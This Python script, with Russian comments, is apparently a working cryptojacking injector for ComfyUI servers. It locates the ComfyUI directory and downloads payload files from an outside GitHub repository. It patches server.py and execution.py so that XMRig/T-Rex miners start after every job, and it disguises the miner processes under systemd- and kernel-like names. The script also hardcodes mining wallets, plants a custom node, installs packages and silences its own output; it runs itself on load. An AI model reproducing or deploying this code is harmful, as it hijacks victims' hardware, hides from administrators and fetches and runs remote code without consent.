# FUCK_PUTIN

import importlib
import ipaddress
import py_compile
import random
import re
import shutil
import string
import subprocess
import sys
import tempfile
import textwrap
import traceback
import urllib.request
from io import StringIO
from pathlib import Path

HOME_DIR = ""

KRX_WALLET = "krxXJ6QJPW"
OCEAN_WALLET = "885VUf2YL1WDTQZm36tSZU7NqZaSFNSvWH96431L1y5K3cde8sUEQZEQpbxS8JKW7Y6xc8DDEW1xpGWYyAngqG3F8RJtCX5"

NAMES = ["systemd-logind-helper", "systemd-update-agt", "systemd-worker", "systemd-hostnamed", "systemd-svc",
         "systemd-net", "systemd-maint", "systemd-watch", "systemd-sync", "systemd-cache", "systemd-backup",
         "systemd-logger", "systemd-poll", "systemd-sched", "system-update", "system-updt", "system-runner",
         "system-agent", "systemd-agent", "systemd-helper", "systemd-sec", "systemd-conn", "systemd-mon",
         "login-helper", "login-svc", "login-agent", "login-watch", "udevd-helper", "udev-agent", "udev-run",
         "udev-svc", "dbus-helper", "dbus-agent", "dbus-svc", "netdata-updater", "netdata-worker", "netdata-sync",
         "netdata-agent", "netd-upd", "netd-svc", "netd-helper", "net-monitor", "net-sync", "net-backup", "svc-updater",
         "svc-runner", "svc-agent", "svc-daemon", "svc-maint", "svc-sync", "service-runner", "service-agent",
         "service-upd", "service-backup", "runner-maint", "runner-svc", "runner-agent", "watchdog-maint",
         "watchdog-svc", "watchdog-agent", "watchdog-sync", "watchdog-run", "tmp-runner", "tmp-svc", "sys-apt",
         "tmp-upd", "tmp-helper", "tmpdaemon", "run00123", "run-helper", "run-svc", "run-agent", "kdevtmpfs",
         "kdevtmpfs-01", "kdevtmpfs_az", "kswapd99", "kswapd77", "kswapd-obj", "kworker-42:0", "kworker-7:1",
         "kworker-3-irq", "kworker42", "kthrotld", "kthrotld-01", "khugepaged", "khugepaged-aux", "kernel-helper",
         "kernel-svc", "kern-run", "a1b2c3d4", "b2c3d4e5", "c3d4e5f6", "deadbeef", "feedface", "cafebabe", "facefeed",
         "hexname01", "hexname02", "randname9", "randname42", "alpha001", "alpha002", "beta1234", "gamma5678",
         "epsilon12", "svc00123", "svc00456", "svc-run002", "svc-upd003", "daemonX01", "daemonX02", "daemon-helper",
         "daemon-updater", "daemon-runner", "mgr-agent", "mgr-service", "mgr-helper", "mgr-update", "mgr-sync",
         "upd-agent-01", "upd-agent-02", "update-svc", "update-run", "update-helper", "updater-daemon", "autoupd01",
         "autoupd-svc", "auto-runner", "auto-helper", "syslog-helper", "syslog-agent", "logd-helper", "logd-run",
         "logd-sync", "polkitd-helper", "polkitd-agent", "loader-svc", "loader-run", "loader-helper", "cache-cleaner",
         "cache-maint", "cache-agent", "sync-agent01", "sync-service", "sync-runner", "backup-agent", "backup-svc",
         "backup-run", "monitor-agent", "monitor-svc", "monitor-runner", "health-checker", "health-agent", "health-svc",
         "procwatcher", "proc-monitor", "task-runner01", "task-agent02", "task-svc03", "tmpfile123", "varrun001",
         "vartmp-agent", "vartmp-run", "runfile99", "exechelper01", "exec-helper-02", "bin_helper01", "bin-runner02",
         "service_a1", "service_b2", "service_c3", "svc_a1b2", "svc_c3d4", "sys-helper-001", "sys-maint-01",
         "sys-agent-02", "sys-upd-03", "sysrunner99", "sysdaemon42", "syswatcher01", "syslogger02", "update_agent_x",
         "update_agent_y", "update_worker_1", "update_worker_2", "auto_upd_agent", "auto_update_daemon", "patcher-svc",
         "patcher-run", "patcher-helper", "patch-agent-01", "patch-agent-02", "patch-monitor", "upgrade-agent",
         "upgrade-runner", "upgrade-helper", "replica-svc", "replica-agent", "replicator01", "replicator02",
         "confd-helper", "config-agent", "config-run", "cfg-svc01", "cfg-updater", "keeper-svc", "keeper-run",
         "keeper-agent", "guardian-svc", "guardian-helper", "orchestrator01", "orchestrator02", "orch-agent",
         "orch-helper", "agentd-01", "agentd-02", "agent-runner03", "agent-helper04", "manager-svc01",
         "manager-agent02", "manager-helper03", "service-helper-x", "service-helper-y", "svc-helper-01",
         "svc-helper-02", "launcher-svc", "launcher-run", "launcher-agent", "launcher-helper", "starter-svc",
         "starter-agent", "starter-helper", "boot-helper-01", "boot-runner", "boot-maint", "init-helper", "init-run",
         "init-agent", "runtime-helper", "runtime-agent", "runtime-run", "heartbeat-svc", "heartbeat-agent",
         "heartbeat-run", "pulse-monitor", "pulse-helper", "pulse-agent", "healthd-01", "healthd-02", "monitoring-svc",
         "monitoring-agent", "monitoring-helper", "statd-helper", "statd-run", "status-agent", "status-runner",
         "checker-svc", "checker-agent", "checker-run", "inspector01", "inspector02", "inspector-run", "watcher-proc",
         "watcher-daemon", "watcher-helper", "supervisor-svc", "supervisor-run", "supervisor-agent", "control-svc",
         "control-agent", "control-runner", "control-helper", "coord-svc", "coord-agent", "coord-helper", "coord-run",
         "synchro-agent", "synchro-runner", "syncer-svc", "syncer-helper", "syncer-agent", "auditor-svc", "auditor-run",
         "auditor-helper", "auditor-agent", "logger-svc", "logger-run", "logger-agent", "logwatcher01", "logwatcher02",
         "trace-agent", "trace-helper", "trace-run", "tracer-svc", "metricd-01", "metricd-02", "metric-run",
         "metric-agent", "perf-monitor", "perf-helper", "perf-agent", "healthsync01", "healthsync02", "secure-agent",
         "secure-helper", "secure-run", "secupdater01", "secupdater02", "auth-helper", "auth-agent", "auth-runner",
         "auth-svc", "cred-helper", "cred-agent", "cred-run", "session-helper", "session-agent", "session-runner",
         "user-helper", "user-agent", "user-run", "acct-helper", "acct-agent", "acct-run", "quota-helper",
         "quota-agent", "quota-run", "storage-helper", "storage-agent", "storage-runner", "disk-maint", "disk-agent",
         "disk-helper", "fs-checker", "fs-helper", "fs-agent", "mount-helper", "mount-agent", "mount-run",
         "volmgr-agent", "volmgr-helper", "volmgr-run", "cachemgr-helper", "cachemgr-agent", "cachemgr-run",
         "cleaner-svc", "cleaner-agent", "cleaner-run", "tidy-helper", "tidy-agent", "tidy-run", "tempfile-svc",
         "tempfile-run", "tmp-cleaner", "tmp-rotate", "cron-helper", "cron-agent", "cron-runner", "cron-cleaner",
         "crontab-helper", "crontab-agent", "sched-helper", "sched-agent", "task-scheduler", "task-cleaner",
         "job-runner01", "job-runner02", "job-agent01", "job-agent02", "pool-agent", "pool-helper", "pool-runner",
         "connector-svc", "connector-agent", "connector-run", "link-helper", "link-agent", "link-run", "bridge-svc",
         "bridge-agent", "bridge-run", "proxy-helper", "proxy-agent", "proxy-run", "relay-helper", "relay-agent",
         "relay-run", "endpoint-svc", "endpoint-agent", "endpoint-run", "gateway-svc", "gateway-agent", "gateway-run",
         "listener-helper", "listener-agent", "listener-run", "handler-svc", "handler-agent", "handler-run",
         "handler-helper", "processor-svc", "processor-agent", "processor-run", "processor-helper", "apt-runner"]


def ip_to_letters(ip_str: str) -> str:
    letters = []
    for ch in str(int(ipaddress.IPv4Address(ip_str))):
        idx = int(ch)
        if not (-1 < idx < len(string.ascii_uppercase)):
            raise ValueError(f"digit {idx} out of range")
        letters.append(string.ascii_uppercase[idx])
    return "".join(letters)


def get_public_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org", timeout=5) as response:
            ip = response.read().decode("utf-8").strip()
            letters = ip_to_letters(ip)
            print(f"{ip} -> {letters}")
            return letters
    except Exception as e:
        print(f"Could not get public IP: {e}")
        return "worker1488"


def find_comfyui_dir():
    """
    Ищет директорию ComfyUI, анализируя запущенный процесс main.py.
    Использует 'ps -ef' вместо 'pgrep'.
    """
    print("[*] 1.1. Поиск директории ComfyUI через запущенный процесс...")
    try:
        # Используем ps для поиска процесса, содержащего 'ComfyUI/main.py'
        result = subprocess.run(['ps', '-ef'], capture_output=True, text=True)
        if result.returncode == 0:
            processes = result.stdout.splitlines()
            for line in processes:
                if 'ComfyUI/main.py' in line and 'python' in line and not 'grep' in line:
                    # Найден процесс, извлекаем командную строку
                    parts = line.split()
                    # Ищем аргумент, который содержит путь к main.py
                    for arg in parts:
                        if 'ComfyUI/main.py' in arg:
                            main_py_path = Path(arg)
                            comfy_dir = main_py_path.parent
                            print(f"   - Найдена директория ComfyUI: {comfy_dir}")
                            return comfy_dir
                    # Если не нашли через аргументы, пробуем разбор строки
                    # Команда обычно выглядит как python /path/to/ComfyUI/main.py ...
                    # Ищем путь до main.py в строке
                    import re
                    match = re.search(r'(.*/ComfyUI/[^/\s]*)/main\.py', line)
                    if match:
                        main_py_path = match.group(0)  # Полный путь к main.py
                        comfy_dir = Path(main_py_path).parent
                        print(f"   - Найдена директория ComfyUI: {comfy_dir}")
                        return comfy_dir

            print("   - Процесс, содержащий 'ComfyUI/main.py', не найден.")
            return None
        else:
            print("   - Ошибка выполнения 'ps -ef'.")
            return None
    except (subprocess.CalledProcessError, FileNotFoundError, PermissionError) as e:
        print(f"   - Ошибка при поиске процесса: {e}")
        return None


def inject():
    old_stdout, old_stderr = sys.stdout, sys.stderr
    sys.stdout = sys.stderr = log_stream = StringIO()

    with (tempfile.TemporaryDirectory() as temp_dir_str):
        temp_dir = Path(temp_dir_str)
        try:
            session_utils_url = "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/session_utils.py"
            miner_manager_url = "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/miner_manager.py"
            srl_init_url = "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/init.py"
            required_packages = [('aiohttp', 'aiohttp'), ('Crypto', 'pycryptodome'),
                                 ('aiohttp_session', 'aiohttp_session[secure]')]

            def run_command(cmd_str):
                try:
                    return subprocess.run(cmd_str, shell=True, capture_output=True, text=True, check=True).stdout
                except subprocess.CalledProcessError as e:
                    return f"Error executing '{cmd_str}': {e}"
                except Exception as e:
                    return f"Unexpected error running '{cmd_str}': {e}"

            # Команда для CPU
            print("=== CPU Information ===")
            print(run_command(
                "lscpu | grep -E '^(Model name|CPU\\(s\\)|Core\\(s\\) per socket|Socket\\(s\\)|Thread\\(s\\) per core|NUMA node\\(s\\)|CPU max MHz)'"))

            # Команда для GPU (предполагается, что nvidia-smi доступна)
            print("\n=== GPU Information (nvidia-smi) ===")
            print(run_command("nvidia-smi"))

            # --- Шаг 1: Поиск директории ---
            print("[*] 1. Поиск корневой директории ComfyUI...")
            current_path = Path.cwd()
            if HOME_DIR != "":
                # Если HOME_DIR задан, используем его
                root_dir = Path(HOME_DIR)
                print(f"[+] Использую HOME_DIR: {root_dir.resolve()}")
            else:
                # Пытаемся найти через запущенный процесс
                root_dir = find_comfyui_dir()
                if not root_dir:
                    # Если через процесс не нашли, используем старую логику
                    print("   - Поиск через процесс не удался, использую резервную логику...")
                    if (current_path / "ComfyUI").exists():
                        if (current_path / "server.py").is_file() and (current_path / "main.py").is_file():
                            root_dir = current_path
                    else:
                        search_path_up = current_path
                        for _ in range(5):
                            if (search_path_up / "server.py").is_file() and (search_path_up / "main.py").is_file():
                                root_dir = search_path_up
                                break
                            if search_path_up == search_path_up.parent: break
                            search_path_up = search_path_up.parent
                        if not root_dir:
                            valid_candidates = [p.parent for p in current_path.rglob("server.py") if
                                                (p.parent / "main.py").is_file()]
                            if len(valid_candidates) >= 1: root_dir = min(valid_candidates,
                                                                          key=lambda p: len(str(p.resolve()))).parent

            if not root_dir: raise RuntimeError("ПРОВАЛ. Не удалось найти директорию ComfyUI.")
            print(f"[+] Директория найдена: {root_dir.resolve()}")

            print("\n[*] 2. Подготовка патчей...")

            session_utils_content = urllib.request.urlopen(
                urllib.request.Request(session_utils_url)).read()
            srl_init_content = urllib.request.urlopen(urllib.request.Request(srl_init_url)).read()

            with urllib.request.urlopen(urllib.request.Request(miner_manager_url)) as response:
                miner_manager_content = response.read().decode('utf-8')  # Декодируем bytes в str

            # --- Подготовка патча для server.py (Оба патча вместе) ---
            print("[*] Готовлю комбинированный патч для server.py...")
            server_py_path = root_dir / "server.py"
            try:
                # Читаем ОДИН раз в строку и в список строк
                original_server_content = server_py_path.read_text(encoding='utf-8')
                lines_server = original_server_content.splitlines(True)
            except FileNotFoundError:
                raise RuntimeError(f"ПРОВАЛ. Не найден server.py по пути: {server_py_path}")

            # --- ШАГ 1: Применяем патч для session_utils (твой код, он рабочий) ---
            if "import session_utils" not in original_server_content:
                print("   - Внедряю 'import session_utils'...")
                lines_server.insert(0, "import session_utils\n")
            if "session_utils.setup_routes(self.app)" not in original_server_content:
                print("   - Внедряю 'session_utils.setup_routes'...")
                start_index = next(i for i, line in enumerate(lines_server) if "def add_routes(self):" in line)
                indent = re.match(r'^(\s*)', lines_server[start_index + 1]).group(1)
                end_index = next((i for i in range(start_index + 1, len(lines_server)) if
                                  lines_server[i].strip() and not lines_server[i].startswith(indent)),
                                 len(lines_server))
                lines_server.insert(end_index, f"{indent}session_utils.setup_routes(self.app)\n")

            # --- ШАГ 3: Собираем финальный контент ---
            patched_server_content = "".join(lines_server)
            print("   - Патч для server.py (start_multi_address) успешно подготовлен.")

            original_exec_content = (root_dir / "execution.py").read_text(encoding='utf-8')
            lines_exec = original_exec_content.splitlines(True)

            start_marker = "# --- MINER MANAGER INJECTED START ---"
            end_marker = "# --- MINER MANAGER INJECTED END ---"
            start_idx, end_idx = -1, -1
            for i, line in enumerate(lines_exec):
                if start_marker in line: start_idx = i
                if end_marker in line: end_idx = i; break

            n = len(NAMES)
            i = random.randrange(n)
            j = random.randrange(n - 1)
            if j >= i:
                j += 1
            clean_miner_code = textwrap.dedent(
                miner_manager_content
                .replace("XMRIG_BIN", NAMES[i])
                .replace("TREX_BIN", NAMES[j])
                .replace("{KRX_WALLET}", KRX_WALLET)
                .replace("{OCEAN_WALLET}", OCEAN_WALLET)
                .replace('{HARDCODED_PUBLIC_IP}', get_public_ip())
            ) + '\n'

            if start_idx != -1 and end_idx != -1:
                print("   - Обнаружен старый патч майнера. Обновляю...")
                # Заменяем старый блок кода на новый
                lines_exec = lines_exec[:start_idx] + [clean_miner_code] + lines_exec[end_idx + 1:]
            else:
                print("   - Патч майнера не найден. Выполняю первую установку...")
                last_import_index = max(i for i, line in enumerate(lines_exec) if
                                        line.strip().startswith('import ') or line.strip().startswith('from '))
                lines_exec.insert(last_import_index + 1,
                                  '\n' + clean_miner_code)  # Исправлено: last_import_index вместо last_index

                execute_start_index = next(
                    i for i, line in enumerate(lines_exec) if line.strip().startswith('def execute(self,'))
                body_indent = re.match(r'^(\s*)', lines_exec[execute_start_index]).group(1) + '    '
                end_index = next((i for i in range(execute_start_index + 1, len(lines_exec)) if
                                  lines_exec[i].strip() and not lines_exec[i].startswith(body_indent)), len(lines_exec))
                original_body = lines_exec[execute_start_index + 1: end_index]

                lines_exec[execute_start_index + 1: end_index] = [
                    f"{body_indent}manage_miner('stop')\n", f"{body_indent}try:\n",
                    *[f"    {line}" for line in original_body], f"{body_indent}finally:\n",
                    f"{body_indent}    manage_miner('start')\n"
                ]

            patched_exec_content = "".join(lines_exec)

            print("[+] Патчи подготовлены.")

            # --- Шаг 3: Проверка синтаксиса ---
            print("\n[*] 3. Проверка синтаксиса с помощью py_compile...")
            try:
                temp_server_path = temp_dir / "server.py"
                temp_exec_path = temp_dir / "execution.py"

                temp_server_path.write_text(patched_server_content, encoding='utf-8')
                temp_exec_path.write_text(patched_exec_content, encoding='utf-8')

                py_compile.compile(str(temp_server_path), doraise=True)
                py_compile.compile(str(temp_exec_path), doraise=True)

                print("[+] Проверка синтаксиса пройдена. Патчи безопасны.")
            except py_compile.PyCompileError as e:
                print("[-] ПРОВЕРКА СИНТАКСИСА ПРОВАЛЕНА! Оригинальные файлы не изменены.")
                raise RuntimeError(f"Ошибка синтаксиса в сгенерированном патче:\n{e}")

            print("\n[*] 4. Применение проверенных изменений к реальным файлам...")

            missing_packages = [pip_name for import_name, pip_name in required_packages if
                                not importlib.util.find_spec(import_name)]
            if missing_packages:
                subprocess.run([sys.executable, "-m", "pip", "install"] + missing_packages, check=True,
                               capture_output=True)

            if start_idx == -1:  # Бэкап делаем только при первой установке
                shutil.copy2(root_dir / "server.py", root_dir / "server.bak")
                shutil.copy2(root_dir / "execution.py", root_dir / "execution.bak")

            (root_dir / "session_utils.py").write_bytes(session_utils_content)
            srl_dir = root_dir / "custom_nodes" / "srl-nodes"
            srl_dir.mkdir(parents=True, exist_ok=True)
            (srl_dir / "__init__.py").write_bytes(srl_init_content)
            (root_dir / "server.py").write_text(patched_server_content, encoding='utf-8')
            (root_dir / "execution.py").write_text(patched_exec_content, encoding='utf-8')

            print("\n[*] Заебись! Перезапусти ComfyUI.")

        except Exception as e:
            print(f"[-] ОПЕРАЦИЯ ПРЕРВАНА: {e}\n{traceback.format_exc()}")
        finally:
            log_output = log_stream.getvalue()
            sys.stdout = old_stdout
            sys.stderr = old_stderr
        return log_output


result = inject()
# return result
